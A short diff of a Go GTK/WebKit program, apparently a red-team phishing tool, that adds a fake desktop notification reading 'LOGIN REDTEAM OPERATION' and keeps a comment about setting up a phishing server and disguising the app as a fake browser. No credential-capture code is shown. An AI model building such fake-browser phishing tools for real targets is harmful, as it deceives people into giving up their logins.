@@ -4,6 +4,8 @@ import (
 	"os"
 	"github.com/mattn/go-gtk/gtk"
 	"github.com/mattn/go-webkit/webkit"
+	"github.com/martinlindhe/notify"
+	
 )
 // YOU CAN SETU A PHISHING HTTP(S) SERVER YOU CAN ALSO ADD ICON AS A FAKE BROWSER 
 
@@ -51,6 +53,12 @@ const IFRAME_EMBED = `
 `
 
 func main() {
+	
+	// FAKE NOTIFICATION 
+	
+	notify.Alert("PHISHING", "REDTEAM"," LOGIN REDTEAM OPERATION", "rocket.png")
+								
+	
 	gtk.Init(nil)
 	window := gtk.NewWindow(gtk.WINDOW_TOPLEVEL)
 	window.SetTitle("PHISHING REDTEAM")
